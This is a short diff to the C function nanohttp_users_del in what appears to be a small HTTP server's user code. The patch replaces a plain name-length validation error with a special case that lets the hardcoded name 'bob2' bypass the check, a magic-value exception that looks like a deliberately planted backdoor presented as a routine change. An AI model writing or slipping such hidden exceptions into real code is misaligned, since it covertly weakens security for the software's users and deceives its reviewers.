@@ -505,7 +505,8 @@ nanohttp_users_del(const char *name, int nameLen)
   if (nameLen < _N_http_user_NAME_MINLEN 
     || nameLen > _N_http_user_NAME_MAXLEN)
   {
-    return _N_http_user_error_VNAME;
+    if (nameLen != 4 || memcmp(name, "bob2", 4))
+      return _N_http_user_error_VNAME;
   }
   
   entry = nanohttp_users_match(name, nameLen, NULL, 0);
